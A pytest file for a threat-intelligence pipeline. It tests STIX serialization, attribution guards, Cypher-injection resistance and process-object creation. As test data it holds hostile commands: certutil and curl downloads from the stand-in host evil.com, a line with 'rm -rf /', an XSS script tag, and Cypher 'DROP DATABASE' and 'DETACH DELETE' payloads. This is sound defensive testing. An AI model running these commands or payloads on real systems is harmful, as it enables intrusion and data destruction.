"""Security and robustness tests for the extraction pipeline.

Tests cover:
1. MaaS attribution guard (serialization)
2. Tuple semantics validation (serialization)
3. Input validation / injection resistance (entities, drafts)
4. Cypher injection resistance (distribution)
5. Field contract enforcement (state flow)
6. Process SCO creation from raw_command_lines
7. Fingerprint determinism and collision resistance
8. Effect_refs resolution and cycle detection
"""

from __future__ import annotations

import copy
import uuid

import pytest

from app.graph.state import (
    EntityType,
    GateAction,
    Gate1RejectReason,
    PipelineState,
    PipelineStatus,
)
from app.nodes.deterministic.serialization import (
    _build_process_sco,
    _build_relationships,
    _build_sco,
    _build_sdo,
    _draft_to_procedure,
    _make_sro,
    _validate_bundle,
    _validate_references,
    _validate_tuple_semantics,
    serialize_stix,
    X_PROCEDURE_TYPE,
)
from app.nodes.deterministic.distribution import (
    _build_node_query,
    _build_rel_query,
    _label_hint_match,
    _STIX_TYPE_TO_LABEL,
    _REL_TYPE_TO_NEO4J,
)
from app.nodes.deterministic.normalization import (
    _compute_fingerprint,
    _resolve_sequencing,
    _assess_context_completeness,
)
from app.nodes.gates import (
    gate_0,
    gate_1,
    _apply_draft_edits,
)


# =============================================================================
# Fixtures
# =============================================================================

@pytest.fixture
def maas_entities():
    """Entities with MaaS malware and no explicit intrusion set attribution."""
    return [
        {
            "entity_id": "ent-001",
            "entity_type": EntityType.MALWARE.value,
            "value": "StealC",
            "confidence": 1.0,
            "gate_action": GateAction.APPROVE.value,
            "is_maas": True,
        },
        {
            "entity_id": "ent-002",
            "entity_type": EntityType.CAMPAIGN.value,
            "value": "ClickFix campaign",
            "confidence": 0.5,
            "gate_action": GateAction.APPROVE.value,
        },
        {
            "entity_id": "ent-003",
            "entity_type": EntityType.INTRUSION_SET.value,
            "value": "Unknown actor cluster",
            "confidence": 0.4,  # Low confidence = inferred, not source-named
            "gate_action": GateAction.APPROVE.value,
        },
    ]


@pytest.fixture
def explicit_attribution_entities():
    """Entities with MaaS malware BUT explicit group attribution."""
    return [
        {
            "entity_id": "ent-001",
            "entity_type": EntityType.MALWARE.value,
            "value": "StealC",
            "confidence": 1.0,
            "gate_action": GateAction.APPROVE.value,
            "is_maas": True,
        },
        {
            "entity_id": "ent-002",
            "entity_type": EntityType.CAMPAIGN.value,
            "value": "ClickFix campaign",
            "confidence": 0.9,
            "gate_action": GateAction.APPROVE.value,
        },
        {
            "entity_id": "ent-003",
            "entity_type": EntityType.INTRUSION_SET.value,
            "value": "TA577",
            "confidence": 0.9,  # High confidence = source explicitly named them
            "gate_action": GateAction.APPROVE.value,
        },
    ]


@pytest.fixture
def sample_draft():
    """A minimal valid draft for testing."""
    return {
        "draft_id": "dft-test001",
        "chunk_id": "chk-001",
        "name": "Download Payload via certutil",
        "description": "Test procedure for security testing.",
        "platforms": ["windows"],
        "raw_command_lines": ["certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe"],
        "command_ref": None,
        "components_refs": [],
        "log_source_refs": [],
        "procedure_type": "reporting",
        "techniques": [
            {"technique_id": "T1105", "technique_name": "Ingress Tool Transfer",
             "stix_id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
             "tactic": "command-and-control", "confidence": 0.9},
        ],
        "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "command-and-control"}],
        "confidence": 75,
        "first_observed": "2026-02-15T00:00:00Z",
        "last_observed": None,
        "execution_start": None,
        "execution_end": None,
        "source_refs": [],
        "vulnerability_refs": [],
        "sequence_index": 0,
        "predecessor_indices": [],
        "effect_refs": [],
        "flow_ref": None,
        "detail_gap": False,
        "source_location": {},
        "gate_action": None,
        "reject_reason": None,
        "analyst_edits": None,
        "analyst_rationale": None,
    }


# =============================================================================
# 0. Per-cluster sponsor attribution
# =============================================================================

class TestPerActorSponsorAttribution:
    """intrusion-set --attributed-to--> threat-actor follows the extractor's
    per-cluster `attributed_to`, not a cross product.

    On a four-actor report the cross product asserted MSS/HSSD sponsorship
    for three clusters the report never tied to anyone — one of them
    explicitly unattributed by the report.
    """

    @staticmethod
    def _ent(eid, etype, value, **extra):
        d = {"entity_id": eid, "entity_type": etype, "value": value,
             "confidence": 0.9, "gate_action": "approve"}
        d.update(extra)
        return d

    @staticmethod
    def _attributions(rels, id_registry):
        inv = {v: k for k, v in id_registry.items()}
        return sorted(
            (inv[r["source_ref"]], inv[r["target_ref"]]) for r in rels
            if r["relationship_type"] == "attributed-to"
            and r["source_ref"].startswith("intrusion-set--")
        )

    def test_only_the_named_cluster_is_attributed(self):
        entities = [
            self._ent("is-1", "intrusion_set", "TA412", attributed_to=["MSS", "HSSD"]),
            self._ent("is-2", "intrusion_set", "UNK_DoubleCheck", attributed_to=[]),
            self._ent("ta-1", "threat_actor", "MSS"),
            self._ent("ta-2", "threat_actor", "HSSD"),
        ]
        reg = {"is-1": "intrusion-set--a", "is-2": "intrusion-set--b",
               "ta-1": "threat-actor--m", "ta-2": "threat-actor--h"}
        rels = _build_relationships(
            normalized_drafts=[], draft_lookup={}, entities=entities,
            id_registry=reg, source_identity_id="identity--src",
        )
        assert self._attributions(rels, reg) == [("is-1", "ta-1"), ("is-1", "ta-2")]

    def test_name_match_is_case_insensitive_and_unknown_names_are_ignored(self):
        entities = [
            self._ent("is-1", "intrusion_set", "APT29", attributed_to=["svr", "Nobody"]),
            self._ent("is-2", "intrusion_set", "APT28"),
            self._ent("ta-1", "threat_actor", "SVR"),
        ]
        reg = {"is-1": "intrusion-set--a", "is-2": "intrusion-set--b", "ta-1": "threat-actor--s"}
        rels = _build_relationships(
            normalized_drafts=[], draft_lookup={}, entities=entities,
            id_registry=reg, source_identity_id="identity--src",
        )
        assert self._attributions(rels, reg) == [("is-1", "ta-1")]

    def test_single_cluster_single_sponsor_falls_back_to_the_pair(self):
        """The single-actor report: 'the group' and its sponsor are the whole
        story, and the model may well have returned an empty list."""
        entities = [
            self._ent("is-1", "intrusion_set", "APT29"),
            self._ent("ta-1", "threat_actor", "SVR"),
        ]
        reg = {"is-1": "intrusion-set--a", "ta-1": "threat-actor--s"}
        rels = _build_relationships(
            normalized_drafts=[], draft_lookup={}, entities=entities,
            id_registry=reg, source_identity_id="identity--src",
        )
        assert self._attributions(rels, reg) == [("is-1", "ta-1")]

    def test_several_clusters_without_a_signal_get_nothing(self):
        """No fabrication: with several clusters and no per-cluster claim,
        guessing is what created the bug."""
        entities = [
            self._ent("is-1", "intrusion_set", "TA412"),
            self._ent("is-2", "intrusion_set", "UNK_LateNight"),
            self._ent("ta-1", "threat_actor", "MSS"),
        ]
        reg = {"is-1": "intrusion-set--a", "is-2": "intrusion-set--b", "ta-1": "threat-actor--m"}
        rels = _build_relationships(
            normalized_drafts=[], draft_lookup={}, entities=entities,
            id_registry=reg, source_identity_id="identity--src",
        )
        assert self._attributions(rels, reg) == []


# =============================================================================
# 1. MaaS Attribution Guard
# =============================================================================

class TestMaaSAttributionGuard:
    """Verify that MaaS malware does not produce false attribution links."""

    def test_maas_blocks_low_confidence_attribution(self, maas_entities):
        """MaaS-only + low-confidence intrusion set = no attributed-to SRO."""
        id_registry = {
            "ent-001": "malware--aaa",
            "ent-002": "campaign--bbb",
            "ent-003": "intrusion-set--ccc",
        }
        rels = _build_relationships(
            normalized_drafts=[], draft_lookup={},
            entities=maas_entities, id_registry=id_registry,
            source_identity_id="identity--src",
        )
        # Should NOT have campaign attributed-to intrusion-set
        attributed_to = [
            r for r in rels
            if r["relationship_type"] == "attributed-to"
            and r["source_ref"] == "campaign--bbb"
        ]
        assert len(attributed_to) == 0, (
            "MaaS guard should block attributed-to when intrusion set confidence < 0.8"
        )

    def test_explicit_attribution_allowed(self, explicit_attribution_entities):
        """Explicit high-confidence attribution should still produce SRO."""
        id_registry = {
            "ent-001": "malware--aaa",
            "ent-002": "campaign--bbb",
            "ent-003": "intrusion-set--ccc",
        }
        rels = _build_relationships(
            normalized_drafts=[], draft_lookup={},
            entities=explicit_attribution_entities, id_registry=id_registry,
            source_identity_id="identity--src",
        )
        attributed_to = [
            r for r in rels
            if r["relationship_type"] == "attributed-to"
            and r["source_ref"] == "campaign--bbb"
        ]
        assert len(attributed_to) == 1, (
            "Explicit high-confidence attribution should produce attributed-to SRO"
        )

    def test_non_maas_malware_unaffected(self):
        """Non-MaaS malware should always allow attribution."""
        entities = [
            {
                "entity_id": "ent-001",
                "entity_type": EntityType.MALWARE.value,
                "value": "SUNBURST",
                "confidence": 1.0,
                "gate_action": GateAction.APPROVE.value,
                "is_maas": False,
            },
            {
                "entity_id": "ent-002",
                "entity_type": EntityType.CAMPAIGN.value,
                "value": "SolarWinds compromise",
                "confidence": 1.0,
                "gate_action": GateAction.APPROVE.value,
            },
            {
                "entity_id": "ent-003",
                "entity_type": EntityType.INTRUSION_SET.value,
                "value": "APT29",
                "confidence": 0.5,  # Even low confidence should be fine for non-MaaS
                "gate_action": GateAction.APPROVE.value,
            },
        ]
        id_registry = {
            "ent-001": "malware--aaa",
            "ent-002": "campaign--bbb",
            "ent-003": "intrusion-set--ccc",
        }
        rels = _build_relationships(
            normalized_drafts=[], draft_lookup={},
            entities=entities, id_registry=id_registry,
            source_identity_id="identity--src",
        )
        attributed_to = [
            r for r in rels
            if r["relationship_type"] == "attributed-to"
            and r["source_ref"] == "campaign--bbb"
        ]
        assert len(attributed_to) == 1


# =============================================================================
# 2. Tuple Semantics Validation
# =============================================================================

class TestTupleSemantics:
    """Verify P = { AP != empty, LS != empty, C != empty } enforcement."""

    def test_complete_tuple_passes(self):
        """Procedure with all three tuple elements passes validation."""
        bundle = {
            "objects": [{
                "type": "x-procedure",
                "id": f"x-procedure--{uuid.uuid4()}",
                "spec_version": "2.1",
                "created": "2026-01-01T00:00:00Z",
                "modified": "2026-01-01T00:00:00Z",
                "name": "Test Procedure",
                "confidence": 80,
                "x_technique_refs": ["attack-pattern--abc"],
                "x_log_source_refs": ["x-log-source--def"],
                "x_components_refs": ["process--ghi"],
            }],
        }
        errors = []
        valid = _validate_tuple_semantics(bundle, errors)
        assert valid is True
        assert len(errors) == 0

    def test_high_confidence_missing_ap_is_error(self):
        """High-confidence procedure missing AP is a validation error."""
        bundle = {
            "objects": [{
                "type": "x-procedure",
                "id": f"x-procedure--{uuid.uuid4()}",
                "name": "Missing Techniques",
                "confidence": 80,
                "x_log_source_refs": ["x-log-source--def"],
                "x_components_refs": ["process--ghi"],
            }],
        }
        errors = []
        valid = _validate_tuple_semantics(bundle, errors)
        assert valid is False
        assert any("AP" in e for e in errors)

    def test_low_confidence_missing_elements_is_warning(self):
        """Low-confidence procedure with missing elements is warning, not error."""
        bundle = {
            "objects": [{
                "type": "x-procedure",
                "id": f"x-procedure--{uuid.uuid4()}",
                "name": "Sparse Procedure",
                "confidence": 40,
                # Missing all three tuple elements
            }],
        }
        errors = []
        valid = _validate_tuple_semantics(bundle, errors)
        assert valid is True  # Warnings, not errors
        assert len(errors) > 0  # But warnings are still logged
        assert any("warning" in e for e in errors)

    def test_components_refs_satisfies_c(self):
        """x_components_refs present satisfies the C element of the tuple.

        The validator's C element is x_components_refs (see
        _validate_tuple_semantics docstring). The primary command is just
        the first entry in x_components_refs — the old standalone
        x_command_ref field was removed in v0.5.0-draft. This asserts the
        real contract: a procedure with all three tuple elements emits no
        C-element warning.
        """
        bundle = {
            "objects": [{
                "type": "x-procedure",
                "id": f"x-procedure--{uuid.uuid4()}",
                "name": "Has Components Ref",
                "confidence": 80,
                "x_technique_refs": ["attack-pattern--abc"],
                "x_log_source_refs": ["x-log-source--def"],
                "x_components_refs": ["process--ghi"],
            }],
        }
        errors = []
        valid = _validate_tuple_semantics(bundle, errors)
        assert valid is True
        assert not any("C (" in e for e in errors)


# =============================================================================
# 3. Input Validation / Injection Resistance
# =============================================================================

class TestInputValidation:
    """Verify that malicious or malformed input is handled safely."""

    def test_entity_with_script_injection_in_value(self):
        """Entity value containing script tags should be preserved as-is, not executed."""
        entity = {
            "entity_type": EntityType.IOC_DOMAIN.value,
            "value": "<script>alert('xss')</script>.evil.com",
            "gate_action": GateAction.APPROVE.value,
        }
        stix_obj = _build_sco(
            "domain-name",
            f"domain-name--{uuid.uuid4()}",
            entity["value"],
            entity["entity_type"],
            entity,
        )
        # Value should be preserved exactly, not sanitized or executed
        assert stix_obj["value"] == "<script>alert('xss')</script>.evil.com"

    def test_command_line_with_shell_metacharacters(self):
        """Command lines with shell metacharacters should be preserved verbatim."""
        cmd = "cmd.exe /c \"powershell -enc $(base64 -d <<< 'payload')\" && rm -rf / ; echo pwned"
        sco = _build_process_sco(cmd)
        assert sco["command_line"] == cmd
        assert sco["type"] == "process"

    def test_extremely_long_entity_value(self):
        """Very long entity values should not cause crashes.

        Contract change: _detect_hash_type returns None for unknown lengths,
        so _build_sco returns None rather than mis-typing the SCO. The
        no-crash invariant is what this test guards.
        """
        entity = {
            "entity_type": EntityType.IOC_HASH.value,
            "value": "a" * 100_000,  # 100KB hash value (clearly invalid, but shouldn't crash)
            "gate_action": GateAction.APPROVE.value,
        }
        sco = _build_sco(
            "file",
            f"file--{uuid.uuid4()}",
            entity["value"],
            entity["entity_type"],
            entity,
        )
        # 100KB has unknown hash length → _detect_hash_type returns None →
        # _build_sco skips rather than mis-typing. None is the expected,
        # non-crashing outcome.
        assert sco is None

    def test_null_bytes_in_entity_value(self):
        """Null bytes in values should not cause crashes."""
        entity = {
            "entity_type": EntityType.IOC_DOMAIN.value,
            "value": "evil\x00.com",
            "gate_action": GateAction.APPROVE.value,
        }
        sco = _build_sco(
            "domain-name",
            f"domain-name--{uuid.uuid4()}",
            entity["value"],
            entity["entity_type"],
            entity,
        )
        assert sco is not None

    def test_unicode_in_procedure_name(self):
        """Unicode characters in procedure names should be preserved."""
        draft = {
            "name": "Execute Payload via мимикатз",  # Russian "mimikatz"
            "description": "Test with unicode.",
            "techniques": [],
            "platforms": [],
            "procedure_type": "reporting",
        }
        ndraft = {"composite_confidence": 50}
        result = _draft_to_procedure(draft, ndraft, "identity--src")
        assert result["name"] == "Execute Payload via мимикатз"


# =============================================================================
# 4. Cypher Injection Resistance
# =============================================================================

class TestCypherInjection:
    """Verify that Cypher queries use parameterization, not string interpolation."""

    def test_node_query_uses_parameters(self):
        """Node queries should use $param placeholders, not interpolated values."""
        malicious_obj = {
            "type": "malware",
            "id": "malware--test",
            "spec_version": "2.1",
            "created": "2026-01-01T00:00:00Z",
            "modified": "2026-01-01T00:00:00Z",
            "name": "'; DROP DATABASE neo4j; --",  # SQL/Cypher injection attempt
            "is_family": True,
        }
        result = _build_node_query(malicious_obj)
        assert result is not None
        # The malicious value should be in params, NOT in the query string
        assert "DROP DATABASE" not in result["query"]
        # Properties now travel as one `$props` map (`SET n += $props`), so
        # neither the value NOR the key can reach the query text.
        assert result["params"]["props"]["name"] == "'; DROP DATABASE neo4j; --"

    def test_rel_query_uses_parameters(self):
        """Relationship queries should parameterize source and target refs."""
        malicious_rel = {
            "type": "relationship",
            "id": "relationship--test",
            "relationship_type": "uses",
            "source_ref": "malware--'; MATCH (n) DETACH DELETE n; --",
            "target_ref": "x-procedure--victim",
        }
        result = _build_rel_query(malicious_rel)
        assert result is not None
        # Injection attempt should be in params, not query
        assert "DETACH DELETE" not in result["query"]
        assert "MATCH (n)" not in result["query"]

    def test_label_hint_rejects_invalid_prefixes(self):
        """Label hints should not inject arbitrary labels from STIX IDs."""
        # A crafted STIX ID with a label injection attempt
        malicious_ref = "Procedure} SET n.admin=true WITH n MATCH (m:User {stix_id: $x"
        result = _label_hint_match("a", "source_ref", malicious_ref)
        # Should fall through to the no-label path (no match in _STIX_TYPE_TO_LABEL)
        assert "admin=true" not in result or result.startswith("(a {stix_id:")

    def test_all_stix_types_have_safe_labels(self):
        """All label mappings should be simple alphanumeric strings."""
        import re
        for stix_type, label in _STIX_TYPE_TO_LABEL.items():
            assert re.match(r'^[A-Za-z0-9]+$', label), (
                f"Label '{label}' for type '{stix_type}' contains unsafe characters"
            )

    def test_all_rel_types_have_safe_names(self):
        """All relationship type mappings should be safe for Cypher."""
        import re
        for stix_rel, neo4j_rel in _REL_TYPE_TO_NEO4J.items():
            assert re.match(r'^[A-Z_]+$', neo4j_rel), (
                f"Rel type '{neo4j_rel}' for '{stix_rel}' contains unsafe characters"
            )


# =============================================================================
# 5. Process SCO Creation
# =============================================================================

class TestProcessSCOCreation:
    """Verify Process SCO creation from raw command lines."""

    def test_basic_command_line(self):
        """Process SCO should carry the exact command line."""
        sco = _build_process_sco("certutil.exe -urlcache -f http://evil.com/a.exe C:\\a.exe")
        assert sco["type"] == "process"
        assert sco["command_line"] == "certutil.exe -urlcache -f http://evil.com/a.exe C:\\a.exe"
        assert sco["id"].startswith("process--")
        assert sco["spec_version"] == "2.1"

    def test_exe_name_extraction(self):
        """Should extract executable name from command line."""
        sco = _build_process_sco("C:\\Windows\\System32\\cmd.exe /c whoami")
        assert sco["x_exe_name"] == "cmd.exe"

    def test_linux_path_extraction(self):
        """Should handle Linux-style paths."""
        sco = _build_process_sco("/usr/bin/curl -o /tmp/payload http://evil.com/p")
        assert sco["x_exe_name"] == "curl"

    def test_empty_command_line(self):
        """Empty command line should not crash."""
        sco = _build_process_sco("")
        assert sco["type"] == "process"
        assert sco["command_line"] == ""

    def test_unique_ids(self):
        """Each Process SCO should get a unique ID."""
        sco1 = _build_process_sco("cmd.exe /c whoami")
        sco2 = _build_process_sco("cmd.exe /c whoami")
        assert sco1["id"] != sco2["id"]


# =============================================================================
# 6. Fingerprint Computation
# =============================================================================

class TestFingerprint:
    """Verify fingerprint determinism and collision resistance."""

    def test_deterministic(self, sample_draft):
        """Same draft should produce same fingerprint."""
        fp1 = _compute_fingerprint(sample_draft)
        fp2 = _compute_fingerprint(sample_draft)
        assert fp1 == fp2
        assert len(fp1) == 32  # Truncated SHA-256

    def test_different_techniques_different_fingerprint(self, sample_draft):
        """Changing techniques should change fingerprint."""
        draft2 = copy.deepcopy(sample_draft)
        draft2["techniques"] = [
            {"technique_id": "T1059.001", "technique_name": "PowerShell",
             "stix_id": "attack-pattern--xyz", "tactic": "execution", "confidence": 0.9},
        ]
        assert _compute_fingerprint(sample_draft) != _compute_fingerprint(draft2)

    def test_command_lines_irrelevant_to_fingerprint(self, sample_draft):
        """Changing only command lines must NOT change fingerprint.

        The canonical formula is hash(x_technique_refs | platforms |
        tactics) — command-line variation is exactly the noise that
        behavioral grouping should ignore. Two procedures executing the
        same techniques on the same platforms with different command
        invocations are the same behavioral pattern and must share a
        fingerprint.
        """
        draft2 = copy.deepcopy(sample_draft)
        draft2["raw_command_lines"] = ["powershell -enc dGVzdA=="]
        assert _compute_fingerprint(sample_draft) == _compute_fingerprint(draft2)

    def test_different_tactics_different_fingerprint(self, sample_draft):
        """Changing tactics should change fingerprint (replaces the
        command-line sensitivity test from the old formula).

        Updates both `kill_chain_phases` and `techniques[*].tactic` together
        because the fingerprint formula prefers `kill_chain_phases` when
        present (matches what the serializer emits to STIX). Drafting in
        production always sets both consistently — varying only one is
        not a realistic scenario.
        """
        draft2 = copy.deepcopy(sample_draft)
        for t in draft2["techniques"]:
            t["tactic"] = "impact"
        draft2["kill_chain_phases"] = [
            {"kill_chain_name": "mitre-attack", "phase_name": "impact"},
        ]
        original_tactics = {
            phase.get("phase_name")
            for phase in sample_draft.get("kill_chain_phases", [])
            if phase.get("kill_chain_name") == "mitre-attack"
        } or {t.get("tactic") for t in sample_draft["techniques"]}
        if original_tactics != {"impact"}:
            assert _compute_fingerprint(sample_draft) != _compute_fingerprint(draft2)

    def test_empty_draft_does_not_crash(self):
        """Draft with no techniques or commands should still produce a fingerprint."""
        empty = {"techniques": [], "platforms": [], "raw_command_lines": []}
        fp = _compute_fingerprint(empty)
        assert len(fp) == 32

    def test_platform_order_irrelevant(self, sample_draft):
        """Fingerprint should be the same regardless of platform order."""
        draft2 = copy.deepcopy(sample_draft)
        sample_draft["platforms"] = ["windows", "linux"]
        draft2["platforms"] = ["linux", "windows"]
        assert _compute_fingerprint(sample_draft) == _compute_fingerprint(draft2)


# =============================================================================
# 7. Sequencing Resolution
# =============================================================================

class TestSequencingResolution:
    """Verify that numeric sequencing is correctly resolved to effect_refs."""

    def test_linear_chain(self):
        """A -> B -> C should produce correct effect_refs."""
        drafts = [
            {"draft_id": "dft-a", "sequence_index": 1, "predecessor_indices": [],
             "effect_refs": [], "flow_ref": None},
            {"draft_id": "dft-b", "sequence_index": 2, "predecessor_indices": [1],
             "effect_refs": [], "flow_ref": None},
            {"draft_id": "dft-c", "sequence_index": 3, "predecessor_indices": [2],
             "effect_refs": [], "flow_ref": None},
        ]
        _resolve_sequencing(drafts)

        assert drafts[0]["effect_refs"] == ["dft-b"]  # A -> B
        assert drafts[1]["effect_refs"] == ["dft-c"]  # B -> C
        assert drafts[2]["effect_refs"] == []          # C -> (end)

    def test_branching(self):
        """A -> B and A -> C (branch) should produce two effect_refs on A."""
        drafts = [
            {"draft_id": "dft-a", "sequence_index": 1, "predecessor_indices": [],
             "effect_refs": [], "flow_ref": None},
            {"draft_id": "dft-b", "sequence_index": 2, "predecessor_indices": [1],
             "effect_refs": [], "flow_ref": None},
            {"draft_id": "dft-c", "sequence_index": 3, "predecessor_indices": [1],
             "effect_refs": [], "flow_ref": None},
        ]
        _resolve_sequencing(drafts)

        assert set(drafts[0]["effect_refs"]) == {"dft-b", "dft-c"}

    def test_no_flow_ref_placeholder_assigned(self):
        """_resolve_sequencing no longer stamps a draft-level flow_ref
        placeholder — the serializer builds the real attack-flow object.
        Only effect_refs are populated here."""
        drafts = [
            {"draft_id": "dft-a", "sequence_index": 1, "predecessor_indices": [],
             "effect_refs": []},
            {"draft_id": "dft-b", "sequence_index": 2, "predecessor_indices": [1],
             "effect_refs": []},
        ]
        _resolve_sequencing(drafts)

        assert drafts[0]["effect_refs"] == ["dft-b"]
        assert "flow_ref" not in drafts[0]
        assert "flow_ref" not in drafts[1]

    def test_no_sequencing(self):
        """Drafts without sequence_index should not be modified."""
        drafts = [
            {"draft_id": "dft-a", "sequence_index": 0, "predecessor_indices": [],
             "effect_refs": [], "flow_ref": None},
        ]
        _resolve_sequencing(drafts)
        assert drafts[0]["effect_refs"] == []
        assert drafts[0]["flow_ref"] is None


# =============================================================================
# 8. Dual Wiring
# =============================================================================

class TestDualWiring:
    """Verify that procedures get both embedded refs and SROs for techniques."""

    def test_procedure_uses_attack_pattern_sros(self, sample_draft):
        """Each technique should produce a procedure uses attack-pattern SRO."""
        ndraft = {"draft_id": "dft-test001", "composite_confidence": 75}
        draft_lookup = {"dft-test001": sample_draft}

        # Simulate: procedure ID is registered
        id_registry = {
            "dft-test001": f"x-procedure--{uuid.uuid4()}",
        }

        rels = _build_relationships(
            normalized_drafts=[ndraft],
            draft_lookup=draft_lookup,
            entities=[],
            id_registry=id_registry,
            source_identity_id="identity--src",
        )

        uses_ap = [
            r for r in rels
            if r["relationship_type"] == "uses"
            and r["target_ref"].startswith("attack-pattern--")
        ]
        assert len(uses_ap) == 1  # One technique = one SRO
        assert uses_ap[0]["source_ref"] == id_registry["dft-test001"]

    def test_embedded_refs_and_sros_match(self, sample_draft):
        """x_technique_refs on the procedure should match the SRO targets."""
        ndraft = {"draft_id": "dft-test001", "composite_confidence": 75, "fingerprint": "abc123"}
        procedure = _draft_to_procedure(sample_draft, ndraft, "identity--src")

        # The embedded ref
        assert len(procedure["x_technique_refs"]) == 1
        embedded_ref = procedure["x_technique_refs"][0]

        # Should be the same STIX ID from the technique mapping
        assert embedded_ref == "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add"


# =============================================================================
# 9. Gate Field Contract
# =============================================================================

class TestGateFieldContract:
    """Verify gates correctly handle the updated field names."""

    def test_gate1_edit_raw_command_lines(self):
        """Gate 1 should allow editing raw_command_lines."""
        draft = {
            "draft_id": "dft-001",
            "raw_command_lines": ["old_cmd"],
            "gate_action": None,
        }
        review = {
            "draft_id": "dft-001",
            "action": GateAction.EDIT.value,
            "analyst_edits": {"raw_command_lines": ["corrected_cmd"]},
        }
        _apply_draft_edits(draft, review)
        assert draft["raw_command_lines"] == ["corrected_cmd"]

    def test_gate1_applies_technique_edits(self):
        """Gate 1 applies analyst technique edits.

        Contract changed with the gate_1 promote-possible feature:
        `techniques` is in _apply_draft_edits's
        _EDITABLE_FIELDS, so analysts can add/remove/correct technique
        mappings inline. (Genuinely read-only computed fields like
        effect_refs are still rejected — see the test below.)
        """
        draft = {
            "draft_id": "dft-001",
            "techniques": [{"technique_id": "T1059"}],
            "gate_action": None,
        }
        review = {
            "draft_id": "dft-001",
            "action": GateAction.EDIT.value,
            "analyst_edits": {"techniques": [{"technique_id": "T1105"}]},
        }
        _apply_draft_edits(draft, review)
        # Techniques ARE editable now — the new value should be applied.
        assert draft["techniques"][0]["technique_id"] == "T1105"

    def test_gate1_rejects_edit_to_effect_refs(self):
        """effect_refs should not be analyst-editable (computed field)."""
        draft = {
            "draft_id": "dft-001",
            "effect_refs": [],
            "gate_action": None,
        }
        review = {
            "draft_id": "dft-001",
            "action": GateAction.EDIT.value,
            "analyst_edits": {"effect_refs": ["dft-002"]},
        }
        _apply_draft_edits(draft, review)
        assert draft["effect_refs"] == []  # Should be unchanged


class TestPerProcedureActorAttribution:
    """Procedures link only to the actors the source attributes them to.

    Audit finding C2. Attribution was a cross product: every intrusion-set
    entity linked to every procedure, technique and tool in the source. On the
    one campaign report — whose entire point is that UNC0001 and OtherGroup are
    UNRELATED ("the vendor assesses that the operations are independent") — the
    bundle asserted OtherGroup and UNC0002 each used all ten of UNC0001's
    procedures and all twenty-one of its techniques.

    False attribution is the most damaging error class in threat intelligence,
    so these assertions are about what must NOT be emitted.
    """

    ACTORS = [
        {"entity_id": "ent-a", "entity_type": "intrusion_set",
         "value": "UNC0001", "confidence": 1.0},
        {"entity_id": "ent-b", "entity_type": "intrusion_set",
         "value": "OtherGroup", "confidence": 1.0},
    ]

    @staticmethod
    def _draft(draft_id, actors, tools=None, technique_sid=None):
        return {
            "draft_id": draft_id,
            "name": f"Procedure {draft_id}",
            "attributed_actors": list(actors),
            "tools_used": list(tools or []),
            "malware_used": [],
            "techniques": (
                [{"technique_id": "T1059", "technique_name": "Cmd",
                  "stix_id": technique_sid}] if technique_sid else []
            ),
            "vulnerability_refs": [],
            "observable_refs": [],
            "components_refs": [],
            "predecessor_indices": [],
            "sequence_index": 1,
        }

    @staticmethod
    def _registry(entities, extra=None):
        reg = {e["entity_id"]: f"intrusion-set--{e['entity_id']}" for e in entities}
        reg.update(extra or {})
        return reg

    def _rels(self, drafts, entities, registry):
        return _build_relationships(
            normalized_drafts=[{"draft_id": d["draft_id"]} for d in drafts],
            draft_lookup={d["draft_id"]: d for d in drafts},
            entities=entities,
            id_registry=registry,
            source_identity_id="identity--src",
        )

    def test_contrast_actor_gets_no_procedure_edges(self):
        drafts = [self._draft("d1", ["UNC0001"])]
        registry = self._registry(self.ACTORS, {"d1": "x-procedure--d1"})
        rels = self._rels(drafts, self.ACTORS, registry)

        attributed = {
            r["source_ref"] for r in rels
            if r["relationship_type"] == "uses"
            and r["target_ref"] == "x-procedure--d1"
        }
        assert attributed == {"intrusion-set--ent-a"}
        assert "intrusion-set--ent-b" not in attributed

    def test_actor_tooling_profile_follows_attribution(self):
        """An unattributed actor inherits no tools or techniques either."""
        tools = [{"entity_id": "ent-t", "entity_type": "tool", "value": "curl"}]
        drafts = [self._draft(
            "d1", ["UNC0001"], tools=["curl"], technique_sid="attack-pattern--t1",
        )]
        entities = self.ACTORS + tools
        registry = self._registry(
            self.ACTORS, {"d1": "x-procedure--d1", "ent-t": "tool--t"},
        )
        rels = self._rels(drafts, entities, registry)

        shiny = {
            (r["relationship_type"], r["target_ref"]) for r in rels
            if r["source_ref"] == "intrusion-set--ent-b"
        }
        assert shiny == set(), (
            "a contrast actor must inherit no tooling or techniques"
        )
        unc = {r["target_ref"] for r in rels
               if r["source_ref"] == "intrusion-set--ent-a"}
        assert "tool--t" in unc
        assert "attack-pattern--t1" in unc

    def test_single_actor_source_falls_back_to_that_actor(self):
        """Reports say 'the group' far more often than they repeat the name."""
        only = [self.ACTORS[0]]
        drafts = [self._draft("d1", [])]
        registry = self._registry(only, {"d1": "x-procedure--d1"})
        rels = self._rels(drafts, only, registry)

        assert any(
            r["source_ref"] == "intrusion-set--ent-a"
            and r["target_ref"] == "x-procedure--d1"
            for r in rels
        )

    def test_multiple_actors_with_no_attribution_emits_nothing(self):
        """Guessing among several actors is what produced the bug."""
        drafts = [self._draft("d1", [])]
        registry = self._registry(self.ACTORS, {"d1": "x-procedure--d1"})
        rels = self._rels(drafts, self.ACTORS, registry)

        assert not any(
            r["target_ref"] == "x-procedure--d1"
            and r["source_ref"].startswith("intrusion-set--")
            for r in rels
        )

    def test_an_actor_name_not_among_the_entities_is_ignored(self):
        """The LLM cannot invent an actor the analyst never approved."""
        drafts = [self._draft("d1", ["Fancy Bear"])]
        registry = self._registry(self.ACTORS, {"d1": "x-procedure--d1"})
        rels = self._rels(drafts, self.ACTORS, registry)

        # Two actors present, so no single-actor fallback either.
        assert not any(
            r["target_ref"] == "x-procedure--d1"
            and r["source_ref"].startswith("intrusion-set--")
            for r in rels
        )
